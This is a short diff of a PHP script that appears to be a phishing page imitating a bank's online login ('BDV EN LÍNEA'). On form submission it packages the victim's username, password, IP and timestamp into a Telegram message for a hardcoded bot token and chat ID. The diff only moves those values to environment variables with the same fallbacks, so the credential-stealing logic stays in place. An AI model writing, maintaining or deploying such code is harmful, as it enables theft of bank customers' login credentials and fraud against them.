@@ -8,8 +8,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $ip = $_SERVER['REMOTE_ADDR'];
     $fecha = date('Y-m-d H:i:s');
 
-    $token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
-    $chat_id = "6912929677";
+    $token = getenv('TELEGRAM_TOKEN') ?: "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
+    $chat_id = getenv('TELEGRAM_CHAT_ID') ?: "6912929677";
     
     $mensaje = urlencode("🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n👤 Usuario: $usuario\n🔑 Clave: $password\n🌐 IP: $ip\n📅 Fecha: $fecha");
     
